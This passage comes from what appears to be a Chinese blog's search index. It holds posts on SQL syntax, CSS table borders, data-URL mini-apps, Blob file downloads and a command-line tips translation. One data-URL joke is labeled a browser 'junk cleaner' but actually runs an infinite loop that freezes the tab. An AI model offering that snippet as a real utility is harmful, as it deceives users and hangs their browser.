CASCADE|RESTRICT; INDEX123CREATE UNIQUE|CLUSTER INDEX &quot;index_name&quot; ON tableName(Col1 DESC, Col2 ASC);ALTER INDX &quot;old_index&quot; RENAME TO &quot;new_index&quot;;DROP INDEX &quot;index_name&quot;; SELECT12345SELECT [DISTINCT|ALL] 2022-table1.age,table2.SnameFROM [&quot;table1&quot; | &quot;view1&quot;]WHERE age&gt;5 AND|OR age&lt;7 AND Sdept='CS' AND age [NOT] BETWEEN 20 AND 30 AND Sdept IN('CS','MA') AND name LIKE '张____' AND GRADE IS NULLGROUP BY Col2 HAVING AVG(Grade)&gt;=90ORDER BY Col1 DESC; 连接查询时，列举全部属性列，去掉相同的列就是自然连接。 单表连接查询： 12345FROM Course.FIRST, Course.SECONDSELECT FIRST.Cno, SECOND.CpnoWHERE FIRST.Cpno=SECOND.Cno;//外连接查询FROM table1 LEFT|RIGHT OUTER JOIN table2 ON|USING(table1.sno=table2.sno) // USING去重 %_任意字符、一个字符，汉字长两个字符 子查询使用IN关键字，阅读/构造时从内部构造。下面的例子相当于是将子查询的结果作为父查询的语句的参数了。 1234567SELECT Sno, Sname, SdeptFROM StudentWHERE Sdept IN ( SELECT Sdept FROM Student WHERE Sname='lex') AND xxx; 还有EXISTS子查询，跟上边IN差不多，不过意思是将”至少存在一个查询结果“作为查询选择器的条件。 多个查询可以用UNION,, INTERSECT, EXCEPT分别进行并，交，差三个集合运算，目标的数据结构必须相同。 INSERT,UPDATE,DELETE123456789101112INSERT INTO table(Col1, Col2) [ VALUES(1,2,3,'4') | SELECT xxx FROM xxx WHERE xxx GROUP BY xxx];UPDATE tableSET Col1=xxxWHERE cond;DELETEFROM tableWHERE cond; VIEW1234CREATE VIEW vname(Col1,Coln)AS 子查询[WITH CHECK OPTION]GROUP BY xxx; 1DROP VIEW vname CASCADE 空值1xxx IS [NOT] NULL","link":"/2024/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/db-review/"},{"title":"table边框设置成单线","text":"有两种方法。 第一种方法：就是利用table标签cellspacing=0属性来实现。 cellspacing是内边框和外边框的距离，这种方法实现的看起来是单实线，其实是内边框线和外边框线组合成的实线。 例： 123&lt;table cellspacing=&quot;0&quot; border=&quot;1px&quot;&gt; ...&lt;/table&gt; 第二种方法是利用css的表格border-collapse属性来实现。 123table{ border-collapse: collapse;} 我更喜欢第二种方法。第一种方法适用于table较少，不考虑可维护的情况。否则，它会让HTML源文件变得混乱。","link":"/2021/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/table%E8%BE%B9%E6%A1%86%E8%AE%BE%E7%BD%AE%E6%88%90%E5%8D%95%E7%BA%BF/"},{"title":"一个奇怪的Base64浏览器记事本","text":"source: 开源一个无后端也无前端彻底无服务的网页版记事本 - V2EX 本体1data:text/html;base64,PGh0bWwgY29udGVudGVkaXRhYmxlPmVkaXQgbWU8L2h0bWw+ 没了。对，没了。直接复制粘贴到浏览器（Chromium系的）地址栏里边打开，然后随便写什么都行。 写完了甚至可以直接Ctrl+S保存网页，再打开甚至 还 能 编 辑 。 大 受 震 撼 . j p g 解析整体而言，这是个利用浏览器解码base64能力实现的编辑器，程序本体就是逗号后边的部分。解码能够得到： 1&lt;html contenteditable&gt;edit me&lt;/html&gt; 所以同理还可以玩更多花活（。 首先可以升级一下： 小加强版： 1data:text/html,&lt;body contenteditable style=line-height:1.5;margin-left:20%;margin-right:20%;font-family:system-ui&gt; 再加强：支持将编辑内容一键复制成 url 分享给其他人 1data:text/html;base64,PGh0bWw+PGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkRvY3VtZW50PC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8YnV0dG9uIGlkPSJidG4iPuWwhue8lui+keWGheWuueWkjeWItuS4ukRhdGFVcmw8L2J1dHRvbj4KICAgIDxkaXYgaWQ9ImVkaXRvci1hcmVhIiBjb250ZW50ZWRpdGFibGU9IiI+PC9kaXY+CiAgCiAgPHN0eWxlPgogICAgI2VkaXRvci1hcmVhIHsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIGhlaWdodDogY2FsYygxMDB2aCAtIDgwcHgpOwogICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgICBvdmVyZmxvdzogc2Nyb2xsOwogICAgICBvdXRsaW5lOiAxcHggc29saWQgZ3JheTsKICAgIH0KICA8L3N0eWxlPgogIDxzY3JpcHQ+CiAgICBmdW5jdGlvbiB1dGY4X3RvX2I2NChzdHIpIHsKICAgICAgcmV0dXJuIHdpbmRvdy5idG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChzdHIpKSk7CiAgICB9CgogICAgLy8gZnVuY3Rpb24gYjY0X3RvX3V0Zjgoc3RyKSB7CiAgICAvLyAgIHJldHVybiBkZWNvZGVVUklDb21wb25lbnQoZXNjYXBlKHdpbmRvdy5hdG9iKHN0cikpKTsKICAgIC8vIH0KCiAgICBjb25zdCBidG4gPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjYnRuIik7CiAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgIGNvbnN0IGh0bWxDb250ZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiaHRtbCIpOwogICAgICBjb25zb2xlLmxvZyhodG1sQ29udGVudC5pbm5lckhUTUwpOwogICAgICBjb25zdCBkYXRhVXJsID0gIjxodG1sPiIgKyBodG1sQ29udGVudC5pbm5lckhUTUwgKyAiPC9odG1sPiI7CiAgICAgIGNvbnN0IGJhc2U2NCA9IHV0ZjhfdG9fYjY0KGRhdGFVcmwpOwogICAgICAvLyBjb25zb2xlLmxvZyhiYXNlNjQpOwoKICAgICAgY29uc3QgaW5wdXRWYWx1ZSA9IGBkYXRhOnRleHQvaHRtbDtiYXNlNjQsJHtiYXNlNjR9YAogICAgICBjb25zdCBpbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CiAgICAgIGlucHV0LnNldEF0dHJpYnV0ZSgicmVhZG9ubHkiLCAicmVhZG9ubHkiKTsKICAgICAgaW5wdXQuc2V0QXR0cmlidXRlKCJ2YWx1ZSIsIGlucHV0VmFsdWUpOwogICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGlucHV0KTsKICAgICAgaW5wdXQuc2V0U2VsZWN0aW9uUmFuZ2UoMCwgOTk5OSk7CiAgICAgIGlucHV0LnNlbGVjdCgpOwogICAgICBkb2N1bWVudC5leGVjQ29tbWFuZCgiY29weSIpOwogICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGlucHV0KTsKICAgIH0pOwogIDwvc2NyaXB0PgoKPC9ib2R5PjwvaHRtbD4= 再加强：VSCode版（不过这个因为用了外置js得联网）： 1data:text/html;charset=utf-8,&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; &lt;/head&gt; &lt;body style=&quot;margin: 0; height: 100vh&quot;&gt; &lt;div id=&quot;container&quot; style=&quot;width: 100%; height: 100%&quot;&gt;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;[https://unpkg.com/monaco-editor@latest/min/vs/loader.js](https://unpkg.com/monaco-editor@latest/min/vs/loader.js)&quot;&gt;&lt;/script&gt; &lt;script&gt; require.config({ paths: { vs: &quot;[https://unpkg.com/monaco-editor@latest/min/vs](https://unpkg.com/monaco-editor@latest/min/vs)&quot; } }); require([&quot;vs/editor/editor.main&quot;], function () { monaco.editor.create(document.getElementById(&quot;container&quot;), { language: &quot;json&quot;, theme: &quot;vs-dark&quot;, }); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 花活1：升级版前端IDE1data:text/html,&lt;body oninput=&quot;i.srcdoc=h.value+'&lt;style&gt;'+c.value+'&lt;/style&gt;&lt;script&gt;'+j.value+'&lt;/script&gt;'&quot;&gt;&lt;style&gt;textarea,iframe{width:100%;height:50%}body{margin:0}textarea{width:33.33%;font-size:18}&lt;/style&gt;&lt;textarea placeholder=HTML id=h&gt;&lt;/textarea&gt;&lt;textarea placeholder=CSS id=c&gt;&lt;/textarea&gt;&lt;textarea placeholder=JS id=j&gt;&lt;/textarea&gt;&lt;iframe id=i&gt; 加强版： 1data:text/html,&lt;body oninput=&quot;i.srcdoc=h.value+'&lt;style&gt;'+c.value+'&lt;/style&gt;&lt;script&gt;'+j.value+'&lt;/script&gt;'&quot;&gt;&lt;style&gt; textarea, iframe { width: 100%; height: 50%; background-color: rgb(245, 245, 245); } body { margin: 0; background-color: rgb(245, 245, 245); } textarea, iframe { width: 33.3%; height: 100%; flex: 1; font-size: 18; resize: none; } textarea:focus { background-color: white; } .menu { text-align: center; overflow: hidden; width: 100%; padding: 5px 0; } .panels { display: flex; justify-content: center; height: calc(100% - 40px); }&lt;/style&gt;&lt;script&gt; function switchDisplay(id) { var dom = document.getElementById(id); if (!dom) return; if (dom.style.display !== '') { dom.style.display = ''; return; } if (dom.style.display === '') { dom.style.display = 'none'; return; } }&lt;/script&gt;&lt;div class=&quot;menu&quot;&gt;&lt;button onclick=&quot;switchDisplay('h')&quot;&gt;HTML&lt;/button&gt;&lt;button onclick=&quot;switchDisplay('c')&quot;&gt;CSS&lt;/button&gt;&lt;button onclick=&quot;switchDisplay('j')&quot;&gt;JavaScript&lt;/button&gt;&lt;button onclick=&quot;switchDisplay('i')&quot;&gt;Output&lt;/button&gt;&lt;/div&gt;&lt;div class=&quot;panels&quot;&gt;&lt;textarea placeholder=HTML id=h&gt;&lt;/textarea&gt;&lt;textarea placeholder=CSS id=c&gt;&lt;/textarea&gt;&lt;textarea placeholder=JS id=j&gt;&lt;/textarea&gt;&lt;iframe id=i&gt;&lt;/div&gt; 评价：好活。 花活2：一键清理浏览器垃圾 并不（ 1data:text/html;charset=utf-8,&lt;script&gt;while(1){Math.random()*Math.random()/Math.random()}alert('清理完成');&lt;/script&gt; 花活3：视频播放器1data:text/html;base64,PCFET0NUWVBFIGh0bWw+DQo8aW5wdXQgdHlwZT0iZmlsZSIgaWQ9ImlucHV0IiBhY2NlcHQ9InZpZGVvLyoiPg0KPGJyPg0KPHZpZGVvIHNyYz0iIiBpZD0idmlkZW8iIGNvbnRyb2xzIGF1dG9wbGF5PjwvdmlkZW8+DQo8c2NyaXB0Pg0KICBpbnB1dC5vbmNoYW5nZSA9ICgpID0+IHsNCiAgICBjb25zdCBmaWxlID0gaW5wdXQuZmlsZXM/LlswXTsNCiAgICBpZiAoZmlsZSkgew0KICAgICAgdmlkZW8uc3JjID0gVVJMLmNyZWF0ZU9iamVjdFVSTChmaWxlKTsNCiAgICB9DQogIH07DQo8L3NjcmlwdD4= 花活4：画板1data:text/html;base64,PGNhbnZhcyBpZD12PjxzY3JpcHQ+ZD1kb2N1bWVudCxkLmJvZHkuc3R5bGUubWFyZ2luPTAsUD0ib25wb2ludGVyIixjPXYuZ2V0Q29udGV4dGAyZGAsdi53aWR0aD1pbm5lcldpZHRoLHYuaGVpZ2h0PWlubmVySGVpZ2h0LGMubGluZVdpZHRoPTIsZj0wLGRbUCsiZG93biJdPWU9PntmPWUucG9pbnRlcklkKzE7ZS5wcmV2ZW50RGVmYXVsdCgpO2MuYmVnaW5QYXRoKCk7Yy5tb3ZlVG8oZS54LGUueSl9O2RbUCsibW92ZSJdPWU9PntmPT1lLnBvaW50ZXJJZCsxJiZjLmxpbmVUbyhlLngsZS55KTtjLnN0cm9rZSgpfSxkW1ArInVwIl09Xz0+Zj0wPC9zY3JpcHQ+PC9jYW52YXM+ 花活：一键存档网页这个注意，前缀javascript:是不会自动粘贴上的（由于浏览器安全策略的原因），必须手动输入前缀才能运行。 1javascript:location.href=&quot;https://web.archive.org/save/&quot;+location.href; 以及之前的URL因为Obsidian的原因，粘贴的时候错误格式化了","link":"/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84Base64%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%B0%E4%BA%8B%E6%9C%AC/"},{"title":"关于前端Blob下载那点事","text":"背景最近做一个项目，后端返回一个Excel表格给前端下载，前端应该使用Blob将文件保存并下载下来。可是前端这里试了半天，数据大小没问题，就是一直下不下来。后来解决了好几个问题之后才成功解决了这个下载问题。 问题1-请求头查找相关资料后，发现似乎错误的请求头是引发这个问题的一个原因。随后就改了请求部分的代码，加上了请求头的配置： 12345678910111213141516171819202122 serviceAxios({ method: 'POST', url: 'xxx', headers: { 'Content-Type': 'application/vnd.ms-excel', Token: localStorage.getItem('token') }, data: this.form_data }) .then((res) =&gt; { this.isShow = false download( res, 'application/vnd.ms-excel', this.form_data.name ) ElMessage.success('下载成功') }) .catch((err) =&gt; { ElMessage.error('下载失败：' + err) })} 但是这样不仅下载的内容打不开，而且下载本身还报错了：HTTP 415：Unsupported Media Type。它的简介如下： 415 Unsupported Media Type 是一种 HTTP 协议的错误状态代码，表示服务器由于不支持其有效载荷的格式，从而拒绝接受客户端的请求。 格式问题的出现有可能源于客户端在 Content-Type 或 Content-Encoding 首部中指定的格式，也可能源于直接对负载数据进行检测的结果。 因此很明显，我应该是设置错了HTTP请求标头。于是查阅了HTTP请求标头的几个字段，发现我应该是搞反了Content-Type和Accept的意思。 Content-Type：自己发送给对方的内容的MIME类型 Accept：自己能接受的内容的MIME类型 常见的MIME类型（ Multipurpose Internet Mail Extensions，媒体类型）如下： 扩展名 文档类型 MIME 类型 .aac AAC audio audio/aac .abw AbiWord document application/x-abiword .arc Archive document (multiple files embedded) application/x-freearc .avi AVI: Audio Video Interleave video/x-msvideo .azw Amazon Kindle eBook format application/vnd.amazon.ebook .bin Any kind of binary data application/octet-stream .bmp Windows OS/2 Bitmap Graphics image/bmp .bz BZip archive application/x-bzip .bz2 BZip2 archive application/x-bzip2 .csh C-Shell script application/x-csh .css Cascading Style Sheets (CSS) text/css .csv Comma-separated values (CSV) text/csv .doc Microsoft Word application/msword .docx Microsoft Word (OpenXML) application/vnd.openxmlformats-officedocument.wordprocessingml.document .eot MS Embedded OpenType fonts application/vnd.ms-fontobject .epub Electronic publication (EPUB) application/epub+zip .gif Graphics Interchange Format (GIF) image/gif .htm .html HyperText Markup Language (HTML) text/html .ico Icon format image/vnd.microsoft.icon .ics iCalendar format text/calendar .jar Java Archive (JAR) application/java-archive .jpeg .jpg JPEG images image/jpeg .js JavaScript text/javascript .json JSON format application/json .jsonld JSON-LD format application/ld+json .mid .midi Musical Instrument Digital Interface (MIDI) audio/midi audio/x-midi .mjs JavaScript module text/javascript .mp3 MP3 audio audio/mpeg .mpeg MPEG Video video/mpeg .mpkg Apple Installer Package application/vnd.apple.installer+xml .odp OpenDocument presentation document application/vnd.oasis.opendocument.presentation .ods OpenDocument spreadsheet document application/vnd.oasis.opendocument.spreadsheet .odt OpenDocument text document application/vnd.oasis.opendocument.text .oga OGG audio audio/ogg .ogv OGG video video/ogg .ogx OGG application/ogg .otf OpenType font font/otf .png Portable Network Graphics image/png .pdf Adobe Portable Document Format (PDF) application/pdf .ppt Microsoft PowerPoint application/vnd.ms-powerpoint .pptx Microsoft PowerPoint (OpenXML) application/vnd.openxmlformats-officedocument.presentationml.presentation .rar RAR archive application/x-rar-compressed .rtf Rich Text Format (RTF) application/rtf .sh Bourne shell script application/x-sh .svg Scalable Vector Graphics (SVG) image/svg+xml .swf Small web format (SWF) or Adobe Flash document application/x-shockwave-flash .tar Tape Archive (TAR) application/x-tar .tif .tiff Tagged Image File Format (TIFF) image/tiff .ttf TrueType Font font/ttf .txt Text, (generally ASCII or ISO 8859-n) text/plain .vsd Microsoft Visio application/vnd.visio .wav Waveform Audio Format audio/wav .weba WEBM audio audio/webm .webm WEBM video video/webm .webp WEBP image image/webp .woff Web Open Font Format (WOFF) font/woff .woff2 Web Open Font Format (WOFF) font/woff2 .xhtml XHTML application/xhtml+xml .xls Microsoft Excel application/vnd.ms-excel .xlsx Microsoft Excel (OpenXML) application/vnd.openxmlformats-officedocument.spreadsheetml.sheet .xml XML application/xml 代码对普通用户来说不可读 (RFC 3023, section 3) text/xml 代码对普通用户来说可读 (RFC 3023, section 3) .xul XUL application/vnd.mozilla.xul+xml .zip ZIP archive application/zip .3gp 3GPP audio/video container video/3gpp audio/3gpp（若不含视频） .3g2 3GPP2 audio/video container video/3gpp2 audio/3gpp2（若不含视频） .7z 7-zip archive application/x-7z-compressed 上面的MIME类型就是Content-Type和Accept两个字段的内容。因此，我们应该将请求头改为如下的形式： 12345headers: { Accept: 'application/vnd.ms-excel', 'Content-Type': 'application/json', Token: localStorage.getItem('token')}, 然后还是出现HTTP 415错误，不过是后端返回的数据的请求头。让后端排查了下，发现是Spring的代理把请求头改成application/json了，所以前端这才会出现415的错误。 但是，还有一个小问题没解决，所以下载还是用不了。 问题2-Blob改了两边的请求头并确定都没问题后，发现虽然能正常下载了，但是下载的内容Execl还是不能打开。但是最奇怪的是，APIfox下载的Excel是可以打开的。遂对比了下APIfox和我的代码下载下来的Excel文件，发现我的好像大了一点。 于是在搜索后，又给axios加上了responseType: 'blob'的参数，并且给生成Blob的地方也加上了application/vnd.ms-execl的参数。再次尝试时，下载已经能正常工作了。 于是我猜测，可能是下载时没有将后端返回的数据转换成Blob数据而直接存入Blob对象，引发了数据错位的问题，导致文件大了一点，并且不能正常打开。 修改后的代码： 1234567891011121314151617181920212223serviceAxios({ method: 'POST', url: `/template/export/${this.form_data.id}`, headers: { Accept: 'application/vnd.ms-excel', 'Content-Type': 'application/json', Token: localStorage.getItem('token') }, data: this.form_data, responseType: 'blob'}).then((res) =&gt; { this.isShow = false download( res, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', this.form_data.name ) ElMessage.success('下载成功')}).catch((err) =&gt; { ElMessage.error('下载失败：' + err)}) 这样就行了。里面的download()是随便封装的一个下载Blob文件的工具函数，参数分别是blob数据，MIME类型和文件名。 关于这个download函数的实现： 12345678910export default (data: any, contentType: string, fileName: string) =&gt; { const downloadLink = window.document.createElement('a') downloadLink.href = window.URL.createObjectURL( new Blob([data], { type: contentType }) ) downloadLink.download = fileName document.body.appendChild(downloadLink) downloadLink.click() document.body.removeChild(downloadLink)} 反思这学期学计网的时候，重点学的部分是物理层，数据链路层，网络层以及传输层。唯一剩下的一层应用层则因为课时压缩直接压没了（但是期末大题还是考了SMTP协议）。但是恰恰是应用层这一部分在日常前端开发中使用最多。 这侧面反映出来了大学教育体系的一些问题，也提醒我们，书不能看一半，趁着大学有时间，尽量让自己的知识面更加全面一些，这是绝对值得的。","link":"/2023/07/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%85%B3%E4%BA%8E%E5%89%8D%E7%AB%AFBlob%E4%B8%8B%E8%BD%BD%E9%82%A3%E7%82%B9%E4%BA%8B/"},{"title":"命令行的艺术","text":"前言 基础 日常使用 文件及数据处理 系统调试 单行脚本 冷门但有用 仅限 OS X 系统 仅限 Windows 系统 更多资源 免责声明 熟练使用命令行是一种常常被忽视，或被认为难以掌握的技能，但实际上，它会提高你作为工程师的灵活性以及生产力。本文是一份我在 Linux 上工作时，发现的一些命令行使用技巧的摘要。有些技巧非常基础，而另一些则相当复杂，甚至晦涩难懂。这篇文章并不长，但当你能够熟练掌握这里列出的所有技巧时，你就学会了很多关于命令行的东西了。 这篇文章是许多作者和译者共同的成果。这里的部分内容首次出现于 Quora，但已经迁移到了 Github，并由众多高手做出了许多改进。如果你在本文中发现了错误或者存在可以改善的地方，请贡献你的一份力量。 前言涵盖范围： 这篇文章不仅能帮助刚接触命令行的新手，而且对具有经验的人也大有裨益。本文致力于做到覆盖面广（涉及所有重要的内容），具体（给出具体的最常用的例子），以及简洁（避免冗余的内容，或是可以在其他地方轻松查到的细枝末节）。在特定应用场景下，本文的内容属于基本功或者能帮助您节约大量的时间。 本文主要为 Linux 所写，但在仅限 OS X 系统章节和仅限 Windows 系统章节中也包含有对应操作系统的内容。除去这两个章节外，其它的内容大部分均可在其他类 Unix 系统或 OS X，甚至 Cygwin 中得到应用。 本文主要关注于交互式 Bash，但也有很多技巧可以应用于其他 shell 和 Bash 脚本当中。 除去“标准的”Unix 命令，本文还包括了一些依赖于特定软件包的命令（前提是它们具有足够的价值）。 注意事项： 为了能在一页内展示尽量多的东西，一些具体的信息可以在引用的页面中找到。我们相信机智的你知道如何使用 Google 或者其他搜索引擎来查阅到更多的详细信息。文中部分命令需要您使用 apt-get，yum，dnf，pacman，pip 或 brew（以及其它合适的包管理器）来安装依赖的程序。 遇到问题的话，请尝试使用 Explainshell 去获取相关命令、参数、管道等内容的解释。 基础 学习 Bash 的基础知识。具体地，在命令行中输入 man bash 并至少全文浏览一遍; 它理解起来很简单并且不冗长。其他的 shell 可能很好用，但 Bash 的功能已经足够强大并且到几乎总是可用的（ 如果你只学习 zsh，fish 或其他的 shell 的话，在你自己的设备上会显得很方便，但过度依赖这些功能会给您带来不便，例如当你需要在服务器上工作时）。 熟悉至少一个基于文本的编辑器。通常而言 Vim （vi） 会是你最好的选择，毕竟在终端中编辑文本时 Vim 是最好用的工具（甚至大部分情况下 Vim 要比 Emacs、大型 IDE 或是炫酷的编辑器更好用）。 学会如何使用 man 命令去阅读文档。学会使用 apropos 去查找文档。知道有些命令并不对应可执行文件，而是在 Bash 内置好的，此时可以使用 help 和 help -d 命令获取帮助信息。你可以用 type 命令 来判断这个命令到底是可执行文件、shell 内置命令还是别名。 学会使用 &gt; 和 &lt; 来重定向输出和输入，学会使用 | 来重定向管道。明白 &gt; 会覆盖了输出文件而 &gt;&gt; 是在文件末添加。了解标准输出 stdout 和标准错误 stderr。 学会使用通配符 * （或许再算上 ? 和 […]） 和引用以及引用中 ' 和 &quot; 的区别（后文中有一些具体的例子）。 熟悉 Bash 中的任务管理工具：&amp;，ctrl-z，ctrl-c，jobs，fg，bg，kill 等。 学会使用 ssh 进行远程命令行登录，最好知道如何使用 ssh-agent，ssh-add 等命令来实现基础的无密码认证登录。 学会基本的文件管理工具：ls 和 ls -l （了解 ls -l 中每一列代表的意义），less，head，tail 和 tail -f （甚至 less +F），ln 和 ln -s （了解硬链接与软链接的区别），chown，chmod，du （硬盘使用情况概述：du -hs *）。 关于文件系统的管理，学习 df，mount，fdisk，mkfs，lsblk。知道 inode 是什么（与 ls -i 和 df -i 等命令相关）。 学习基本的网络管理工具：ip 或 ifconfig，dig。 学习并使用一种版本控制管理系统，例如 git。 熟悉正则表达式，学会使用 grep／egrep，它们的参数中 -i，-o，-v，-A，-B 和 -C 这些是很常用并值得认真学习的。 学会使用 apt-get，yum，dnf 或 pacman （具体使用哪个取决于你使用的 Linux 发行版）来查找和安装软件包。并确保你的环境中有 pip 来安装基于 Python 的命令行工具 （接下来提到的部分程序使用 pip 来安装会很方便）。 日常使用 在 Bash 中，可以通过按 Tab 键实现自动补全参数，使用 ctrl-r 搜索命令行历史记录（按下按键之后，输入关键字便可以搜索，重复按下 ctrl-r 会向后查找匹配项，按下 Enter 键会执行当前匹配的命令，而按下右方向键会将匹配项放入当前行中，不会直接执行，以便做出修改）。 在 Bash 中，可以按下 ctrl-w 删除你键入的最后一个单词，ctrl-u 可以删除行内光标所在位置之前的内容，alt-b 和 alt-f 可以以单词为单位移动光标，ctrl-a 可以将光标移至行首，ctrl-e 可以将光标移至行尾，ctrl-k 可以删除光标至行尾的所有内容，ctrl-l 可以清屏。键入 man readline 可以查看 Bash 中的默认快捷键。内容有很多，例如 alt-. 循环地移向前一个参数，而 alt-* 可以展开通配符。 你喜欢的话，可以执行 set -o vi 来使用 vi 风格的快捷键，而执行 set -o emacs 可以把它改回来。 为了便于编辑长命令，在设置你的默认编辑器后（例如 export EDITOR=vim），ctrl-x ctrl-e 会打开一个编辑器来编辑当前输入的命令。在 vi 风格下快捷键则是 escape-v。 键入 history 查看命令行历史记录，再用 !n（n 是命令编号）就可以再次执行。其中有许多缩写，最有用的大概就是 !$， 它用于指代上次键入的参数，而 !! 可以指代上次键入的命令了（参考 man 页面中的“HISTORY EXPANSION”）。不过这些功能，你也可以通过快捷键 ctrl-r 和 alt-. 来实现。 cd 命令可以切换工作路径，输入 cd ~ 可以进入 home 目录。要访问你的 home 目录中的文件，可以使用前缀 ~（例如 ~/.bashrc）。在 sh 脚本里则用环境变量 $HOME 指代 home 目录的路径。 回到前一个工作路径：cd -。 如果你输入命令的时候中途改了主意，按下 alt-# 在行首添加 # 把它当做注释再按下回车执行（或者依次按下 ctrl-a， **#**， enter）。这样做的话，之后借助命令行历史记录，你可以很方便恢复你刚才输入到一半的命令。 使用 xargs （ 或 parallel）。他们非常给力。注意到你可以控制每行参数个数（-L）和最大并行数（-P）。如果你不确定它们是否会按你想的那样工作，先使用 xargs echo 查看一下。此外，使用 -I{} 会很方便。例如： 12find . -name '*.py' | xargs grep some_functioncat hosts | xargs -I{} ssh root@{} hostname pstree -p 以一种优雅的方式展示进程树。 使用 pgrep 和 pkill 根据名字查找进程或发送信号（-f 参数通常有用）。 了解你可以发往进程的信号的种类。比如，使用 kill -STOP [pid] 停止一个进程。使用 man 7 signal 查看详细列表。 使用 nohup 或 disown 使一个后台进程持续运行。 使用 netstat -lntp 或 ss -plat 检查哪些进程在监听端口（默认是检查 TCP 端口; 添加参数 -u 则检查 UDP 端口）或者 lsof -iTCP -sTCP:LISTEN -P -n (这也可以在 OS X 上运行)。 lsof 来查看开启的套接字和文件。 使用 uptime 或 w 来查看系统已经运行多长时间。 使用 alias 来创建常用命令的快捷形式。例如：alias ll='ls -latr' 创建了一个新的命令别名 ll。 可以把别名、shell 选项和常用函数保存在 ~/.bashrc，具体看下这篇文章。这样做的话你就可以在所有 shell 会话中使用你的设定。 把环境变量的设定以及登陆时要执行的命令保存在 ~/.bash_profile。而对于从图形界面启动的 shell 和 cron 启动的 shell，则需要单独配置文件。 要想在几台电脑中同步你的配置文件（例如 .bashrc 和 .bash_profile），可以借助 Git。 当变量和文件名中包含空格的时候要格外小心。Bash 变量要用引号括起来，比如 &quot;$FOO&quot;。尽量使用 -0 或 -print0 选项以便用 NULL 来分隔文件名，例如 locate -0 pattern | xargs -0 ls -al 或 find / -print0 -type d | xargs -0 ls -al。如果 for 循环中循环访问的文件名含有空字符（空格、tab 等字符），只需用 IFS=$'\\n' 把内部字段分隔符设为换行符。 在 Bash 脚本中，使用 set -x 去调试输出（或者使用它的变体 set -v，它会记录原始输入，包括多余的参数和注释）。尽可能地使用严格模式：使用 set -e 令脚本在发生错误时退出而不是继续运行；使用 set -u 来检查是否使用了未赋值的变量；试试 set -o pipefail，它可以监测管道中的错误。当牵扯到很多脚本时，使用 trap 来检测 ERR 和 EXIT。一个好的习惯是在脚本文件开头这样写，这会使它能够检测一些错误，并在错误发生时中断程序并输出信息： 12set -euo pipefailtrap &quot;echo 'error: Script failed: see failed command above'&quot; ERR 在 Bash 脚本中，子 shell（使用括号 (...)）是一种组织参数的便捷方式。一个常见的例子是临时地移动工作路径，代码如下： 123# do something in current dir(cd /some/other/dir &amp;&amp; other-command)# continue in original dir 在 Bash 中，变量有许多的扩展方式。${name:?error message} 用于检查变量是否存在。此外，当 Bash 脚本只需要一个参数时，可以使用这样的代码 input_file=${1:?usage: $0 input_file}。在变量为空时使用默认值：${name:-default}。如果你要在之前的例子中再加一个（可选的）参数，可以使用类似这样的代码 output_file=${2:-logfile}，如果省略了 $2，它的值就为空，于是 output_file 就会被设为 logfile。数学表达式：i=$(( (i + 1) % 5 ))。序列：{1..10}。截断字符串：${var%suffix} 和 ${var#prefix}。例如，假设 var=foo.pdf，那么 echo ${var%.pdf}.txt 将输出 foo.txt。 使用括号扩展（{…}）来减少输入相似文本，并自动化文本组合。这在某些情况下会很有用，例如 mv foo.{txt,pdf} some-dir（同时移动两个文件），cp somefile{,.bak}（会被扩展成 cp somefile somefile.bak）或者 mkdir -p test-{a,b,c}/subtest-{1,2,3}（会被扩展成所有可能的组合，并创建一个目录树）。 通过使用 &lt;(some command) 可以将输出视为文件。例如，对比本地文件 /etc/hosts 和一个远程文件： 1diff /etc/hosts &lt;(ssh somehost cat /etc/hosts) 编写脚本时，你可能会想要把代码都放在大括号里。缺少右括号的话，代码就会因为语法错误而无法执行。如果你的脚本是要放在网上分享供他人使用的，这样的写法就体现出它的好处了，因为这样可以防止下载不完全代码被执行。 123{ # 在这里写代码} 了解 Bash 中的“here documents”，例如 cat &lt;&lt;EOF ...。 在 Bash 中，同时重定向标准输出和标准错误：some-command &gt;logfile 2&gt;&amp;1 或者 some-command &amp;&gt;logfile。通常，为了保证命令不会在标准输入里残留一个未关闭的文件句柄捆绑在你当前所在的终端上，在命令后添加 &lt;/dev/null 是一个好习惯。 使用 man ascii 查看具有十六进制和十进制值的ASCII表。man unicode，man utf-8，以及 man latin1 有助于你去了解通用的编码信息。 使用 screen 或 tmux 来使用多份屏幕，当你在使用 ssh 时（保存 session 信息）将尤为有用。而 byobu 可以为它们提供更多的信息和易用的管理工具。另一个轻量级的 session 持久化解决方案是 dtach。 ssh 中，了解如何使用 -L 或 -D（偶尔需要用 